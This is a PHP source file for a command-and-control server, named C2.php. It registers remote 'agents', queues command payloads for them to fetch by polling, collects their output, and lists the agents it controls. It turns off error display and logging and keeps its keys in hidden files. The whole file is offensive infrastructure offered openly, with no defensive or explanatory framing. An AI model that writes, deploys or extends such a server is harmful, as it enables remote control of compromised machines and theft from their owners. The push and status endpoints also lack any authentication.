<?php
// C2.php - primary command and control server skeleton

error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

define('ZC_VERSION', '1.0');
define('ZC_ROOT', __DIR__ . '/zc');
define('ZC_LOG', ZC_ROOT . '/c2.log');
define('ZC_DB', ZC_ROOT . '/c2_state.db');
define('ZC_KEY_FILE', ZC_ROOT . '/.c2key');
define('ZC_SALT_FILE', ZC_ROOT . '/.c2salt');
define('ZC_MAX_BODY', 1048576);
define('ZC_TOKEN_LEN', 32);
define('ZC_NONCE_LEN', 16);
define('ZC_TIME_WINDOW', 300);
define('ZC_HASH_ALGO', 'sha256');

function zc_c2_init_dirs() {
    if (!is_dir(ZC_ROOT)) {
        @mkdir(ZC_ROOT, 0700, true);
    }
    if (!is_dir(ZC_ROOT)) {
        return false;
    }
    @chmod(ZC_ROOT, 0700);
    return true;
}

function zc_c2_init_db() {
    if (!file_exists(ZC_DB)) {
        $db = new SQLite3(ZC_DB);
        $db->exec("CREATE TABLE IF NOT EXISTS agents (id TEXT PRIMARY KEY, token TEXT, last_seen TEXT, info TEXT);");
        $db->exec("CREATE TABLE IF NOT EXISTS commands (id TEXT PRIMARY KEY, agent TEXT, payload TEXT, status TEXT, ts TEXT);");
        $db->exec("CREATE TABLE IF NOT EXISTS results (id TEXT PRIMARY KEY, agent TEXT, output TEXT, ts TEXT);");
        $db->exec("CREATE TABLE IF NOT EXISTS nonces (nonce TEXT PRIMARY KEY, ts TEXT);");
        $db->exec("CREATE TABLE IF NOT EXISTS c2_state (key TEXT PRIMARY KEY, value TEXT);");
        $db->close();
    }
}

function zc_c2_db() {
    return new SQLite3(ZC_DB);
}

function zc_c2_state_set($key, $value) {
    $db = zc_c2_db();
    $stmt = $db->prepare("INSERT OR REPLACE INTO c2_state (key, value) VALUES (:k, :v)");
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $stmt->bindValue(':v', $value, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_state_get($key) {
    $db = zc_c2_db();
    $stmt = $db->prepare("SELECT value FROM c2_state WHERE key = :k");
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);
    $db->close();
    if ($row) {
        return $row['value'];
    }
    return '';
}

function zc_c2_log($msg) {
    $ts = date('Y-m-d H:i:s');
    $line = "[$ts] $msg" . PHP_EOL;
    @file_put_contents(ZC_LOG, $line, FILE_APPEND);
}

function zc_c2_gen_token() {
    $bytes = random_bytes(ZC_TOKEN_LEN);
    return bin2hex($bytes);
}

function zc_c2_gen_nonce() {
    $bytes = random_bytes(ZC_NONCE_LEN);
    return bin2hex($bytes);
}

function zc_c2_gen_salt() {
    if (file_exists(ZC_SALT_FILE)) {
        return trim(file_get_contents(ZC_SALT_FILE));
    }
    $salt = bin2hex(random_bytes(32));
    @file_put_contents(ZC_SALT_FILE, $salt);
    @chmod(ZC_SALT_FILE, 0600);
    return $salt;
}

function zc_c2_gen_key() {
    if (file_exists(ZC_KEY_FILE)) {
        return trim(file_get_contents(ZC_KEY_FILE));
    }
    $key = bin2hex(random_bytes(32));
    @file_put_contents(ZC_KEY_FILE, $key);
    @chmod(ZC_KEY_FILE, 0600);
    return $key;
}

function zc_c2_hash($input) {
    return hash(ZC_HASH_ALGO, $input);
}

function zc_c2_sign($payload) {
    $key = zc_c2_gen_key();
    return hash_hmac('sha256', $payload, $key);
}

function zc_c2_verify_sign($payload, $sig) {
    $expected = zc_c2_sign($payload);
    if (strlen($expected) !== strlen($sig)) {
        return false;
    }
    return hash_equals($expected, $sig);
}

function zc_c2_json($data, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function zc_c2_read_body() {
    $raw = file_get_contents('php://input');
    if ($raw === false) {
        return '';
    }
    if (strlen($raw) > ZC_MAX_BODY) {
        return '';
    }
    return $raw;
}

function zc_c2_read_json() {
    $raw = zc_c2_read_body();
    if ($raw === '') {
        return null;
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return null;
    }
    return $data;
}

function zc_c2_check_nonce($nonce) {
    $db = zc_c2_db();
    $stmt = $db->prepare("SELECT COUNT(*) AS c FROM nonces WHERE nonce = :n");
    $stmt->bindValue(':n', $nonce, SQLITE3_TEXT);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);
    $db->close();
    if ($row && $row['c'] > 0) {
        return false;
    }
    return true;
}

function zc_c2_store_nonce($nonce) {
    $db = zc_c2_db();
    $ts = date('Y-m-d H:i:s');
    $stmt = $db->prepare("INSERT OR REPLACE INTO nonces (nonce, ts) VALUES (:n, :t)");
    $stmt->bindValue(':n', $nonce, SQLITE3_TEXT);
    $stmt->bindValue(':t', $ts, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_check_timestamp($ts) {
    $now = time();
    $diff = abs($now - intval($ts));
    if ($diff <= ZC_TIME_WINDOW) {
        return true;
    }
    return false;
}

function zc_c2_cleanup_nonces() {
    $cutoff = date('Y-m-d H:i:s', time() - 3600);
    $db = zc_c2_db();
    $stmt = $db->prepare("DELETE FROM nonces WHERE ts < :c");
    $stmt->bindValue(':c', $cutoff, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_register_agent($id, $token, $info) {
    $db = zc_c2_db();
    $ts = date('Y-m-d H:i:s');
    $stmt = $db->prepare("INSERT OR REPLACE INTO agents (id, token, last_seen, info) VALUES (:i, :t, :s, :n)");
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $stmt->bindValue(':t', $token, SQLITE3_TEXT);
    $stmt->bindValue(':s', $ts, SQLITE3_TEXT);
    $stmt->bindValue(':n', $info, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_get_agent($id) {
    $db = zc_c2_db();
    $stmt = $db->prepare("SELECT id, token, last_seen, info FROM agents WHERE id = :i");
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);
    $db->close();
    return $row ? $row : null;
}

function zc_c2_update_seen($id) {
    $db = zc_c2_db();
    $ts = date('Y-m-d H:i:s');
    $stmt = $db->prepare("UPDATE agents SET last_seen = :s WHERE id = :i");
    $stmt->bindValue(':s', $ts, SQLITE3_TEXT);
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_add_command($agent, $payload) {
    $id = bin2hex(random_bytes(8));
    $db = zc_c2_db();
    $ts = date('Y-m-d H:i:s');
    $stmt = $db->prepare("INSERT OR REPLACE INTO commands (id, agent, payload, status, ts) VALUES (:i, :a, :p, 'pending', :t)");
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $stmt->bindValue(':a', $agent, SQLITE3_TEXT);
    $stmt->bindValue(':p', $payload, SQLITE3_TEXT);
    $stmt->bindValue(':t', $ts, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
    return $id;
}

function zc_c2_get_pending($agent) {
    $db = zc_c2_db();
    $stmt = $db->prepare("SELECT id, payload FROM commands WHERE agent = :a AND status = 'pending' ORDER BY ts LIMIT 1");
    $stmt->bindValue(':a', $agent, SQLITE3_TEXT);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);
    $db->close();
    return $row ? $row : null;
}

function zc_c2_mark_command($id, $status) {
    $db = zc_c2_db();
    $stmt = $db->prepare("UPDATE commands SET status = :s WHERE id = :i");
    $stmt->bindValue(':s', $status, SQLITE3_TEXT);
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function zc_c2_store_result($agent, $output) {
    $id = bin2hex(random_bytes(8));
    $db = zc_c2_db();
    $ts = date('Y-m-d H:i:s');
    $stmt = $db->prepare("INSERT OR REPLACE INTO results (id, agent, output, ts) VALUES (:i, :a, :o, :t)");
    $stmt->bindValue(':i', $id, SQLITE3_TEXT);
    $stmt->bindValue(':a', $agent, SQLITE3_TEXT);
    $stmt->bindValue(':o', $output, SQLITE3_TEXT);
    $stmt->bindValue(':t', $ts, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
    return $id;
}

function zc_c2_get_results($agent) {
    $db = zc_c2_db();
    $stmt = $db->prepare("SELECT id, output, ts FROM results WHERE agent = :a ORDER BY ts DESC LIMIT 50");
    $stmt->bindValue(':a', $agent, SQLITE3_TEXT);
    $res = $stmt->execute();
    $rows = array();
    while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
        $rows[] = $row;
    }
    $db->close();
    return $rows;
}

function zc_c2_handle_register() {
    $data = zc_c2_read_json();
    if ($data === null) {
        zc_c2_json(array('ok' => false, 'err' => 'bad_json'), 400);
    }
    $id = isset($data['id']) ? $data['id'] : '';
    $token = isset($data['token']) ? $data['token'] : '';
    $info = isset($data['info']) ? $data['info'] : '';
    if ($id === '' || $token === '') {
        zc_c2_json(array('ok' => false, 'err' => 'missing'), 400);
    }
    zc_c2_register_agent($id, $token, $info);
    zc_c2_log("register: $id");
    zc_c2_json(array('ok' => true, 'interval' => 5));
}

function zc_c2_handle_poll() {
    $data = zc_c2_read_json();
    if ($data === null) {
        zc_c2_json(array('ok' => false, 'err' => 'bad_json'), 400);
    }
    $id = isset($data['id']) ? $data['id'] : '';
    $nonce = isset($data['nonce']) ? $data['nonce'] : '';
    $ts = isset($data['ts']) ? $data['ts'] : 0;
    $sig = isset($data['sig']) ? $data['sig'] : '';
    if ($id === '' || $nonce === '' || $sig === '') {
        zc_c2_json(array('ok' => false, 'err' => 'missing'), 400);
    }
    if (!zc_c2_check_timestamp($ts)) {
        zc_c2_json(array('ok' => false, 'err' => 'expired'), 400);
    }
    if (!zc_c2_check_nonce($nonce)) {
        zc_c2_json(array('ok' => false, 'err' => 'replay'), 400);
    }
    $signed = $nonce . $ts . $id;
    if (!zc_c2_verify_sign($signed, $sig)) {
        zc_c2_json(array('ok' => false, 'err' => 'sig'), 400);
    }
    zc_c2_store_nonce($nonce);
    zc_c2_update_seen($id);
    $cmd = zc_c2_get_pending($id);
    if ($cmd) {
        zc_c2_mark_command($cmd['id'], 'sent');
        zc_c2_json(array('ok' => true, 'cmd' => $cmd['payload'], 'cid' => $cmd['id']));
    }
    zc_c2_json(array('ok' => true, 'cmd' => ''));
}

function zc_c2_handle_result() {
    $data = zc_c2_read_json();
    if ($data === null) {
        zc_c2_json(array('ok' => false, 'err' => 'bad_json'), 400);
    }
    $id = isset($data['id']) ? $data['id'] : '';
    $nonce = isset($data['nonce']) ? $data['nonce'] : '';
    $ts = isset($data['ts']) ? $data['ts'] : 0;
    $sig = isset($data['sig']) ? $data['sig'] : '';
    $output = isset($data['output']) ? $data['output'] : '';
    if ($id === '' || $nonce === '' || $sig === '') {
        zc_c2_json(array('ok' => false, 'err' => 'missing'), 400);
    }
    if (!zc_c2_check_timestamp($ts)) {
        zc_c2_json(array('ok' => false, 'err' => 'expired'), 400);
    }
    if (!zc_c2_check_nonce($nonce)) {
        zc_c2_json(array('ok' => false, 'err' => 'replay'), 400);
    }
    $signed = $nonce . $ts . $id . $output;
    if (!zc_c2_verify_sign($signed, $sig)) {
        zc_c2_json(array('ok' => false, 'err' => 'sig'), 400);
    }
    zc_c2_store_nonce($nonce);
    $rid = zc_c2_store_result($id, $output);
    zc_c2_log("result: $id $rid");
    zc_c2_json(array('ok' => true, 'rid' => $rid));
}

function zc_c2_handle_push() {
    $data = zc_c2_read_json();
    if ($data === null) {
        zc_c2_json(array('ok' => false, 'err' => 'bad_json'), 400);
    }
    $agent = isset($data['agent']) ? $data['agent'] : '';
    $cmd = isset($data['cmd']) ? $data['cmd'] : '';
    if ($agent === '' || $cmd === '') {
        zc_c2_json(array('ok' => false, 'err' => 'missing'), 400);
    }
    $cid = zc_c2_add_command($agent, $cmd);
    zc_c2_log("push: $agent $cid");
    zc_c2_json(array('ok' => true, 'cid' => $cid));
}

function zc_c2_handle_status() {
    $db = zc_c2_db();
    $agents = array();
    $res = $db->query("SELECT id, last_seen, info FROM agents ORDER BY last_seen DESC");
    while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
        $agents[] = $row;
    }
    $db->close();
    zc_c2_json(array('ok' => true, 'agents' => $agents));
}

function zc_c2_route() {
    $action = isset($_GET['a']) ? $_GET['a'] : '';
    switch ($action) {
        case 'register':
            zc_c2_handle_register();
            break;
        case 'poll':
            zc_c2_handle_poll();
            break;
        case 'result':
            zc_c2_handle_result();
            break;
        case 'push':
            zc_c2_handle_push();
            break;
        case 'status':
            zc_c2_handle_status();
            break;
        default:
            zc_c2_json(array('ok' => false, 'err' => 'unknown'), 404);
    }
}

function zc_c2_main() {
    zc_c2_init_dirs();
    zc_c2_init_db();
    zc_c2_gen_key();
    zc_c2_gen_salt();
    zc_c2_cleanup_nonces();
    zc_c2_route();
}

zc_c2_main();